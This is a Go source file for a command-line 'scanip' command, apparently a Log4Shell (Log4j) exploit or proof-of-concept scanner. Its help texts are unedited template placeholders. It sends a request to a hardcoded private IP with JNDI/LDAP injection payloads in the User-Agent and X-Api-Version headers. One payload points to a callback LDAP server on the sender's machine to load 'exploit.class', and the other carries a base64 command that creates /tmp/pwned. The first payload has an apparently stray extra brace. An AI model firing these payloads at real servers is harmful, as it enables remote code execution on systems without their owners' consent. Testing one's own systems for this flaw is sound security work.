/*
Copyright © 2021 Guy Barnhart-Magen

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program. If not, see <http://www.gnu.org/licenses/>.
*/
package cmd

import (
    "fmt"
    log "github.com/sirupsen/logrus"
    "github.com/spf13/cobra"
    "net"
    "net/http"
    "time"
)

// scanipCmd represents the scanip command
var scanipCmd = &cobra.Command{
    Use:   "scanip",
    Short: "A brief description of your command",
    Long: `A longer description that spans multiple lines and likely contains examples
and usage of using your command. For example:

Cobra is a CLI library for Go that empowers applications.
This application is a tool to generate the needed files
to quickly create a Cobra application.`,
    Run: func(cmd *cobra.Command, args []string) {
        ScanIP("http://192.168.1.59:8080")
    },
}

func init() {
    rootCmd.AddCommand(scanipCmd)

    // Here you will define your flags and configuration settings.

    // Cobra supports Persistent Flags which will work for this command
    // and all subcommands, e.g.:
    // scanipCmd.PersistentFlags().String("foo", "", "A help for foo")

    // Cobra supports local flags which will only run when this command
    // is called directly, e.g.:
    // scanipCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}

func ScanIP(url string) {
    client := &http.Client{
        Timeout: 1000 * time.Millisecond,
    }

    localIP := GetLocalIP()
    log.Infof("Local IP: %s", localIP)

    request, err := http.NewRequest("GET", url, nil)
    if err != nil {
        log.Fatal(err)
    }
    targetUserAgent := fmt.Sprintf("${{jndi:ldap://%s/exploit.class}}", localIP+":5555")
    targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", url)
    log.Debugf("Target URL: %s", url)
    log.Debugf("Target User-Agent: %s", targetUserAgent)
    log.Debugf("Target X-Api-Version: %s", targetHeader)
    request.Header.Set("User-Agent", targetUserAgent)
    request.Header.Add("X-Api-Version", targetHeader)
    response, err := client.Do(request)
    if err != nil {
        log.Fatal(err)
    }
    defer response.Body.Close()
    //b, err := ioutil.ReadAll(response.Body)
    log.Infof("%s ==> Status code: %d", url, response.StatusCode)
    if err != nil {
        log.Error(err)
    }
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return ""
    }
    for _, address := range addrs {
        // check the address type and if it is not a loopback the display it
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    return ""
}
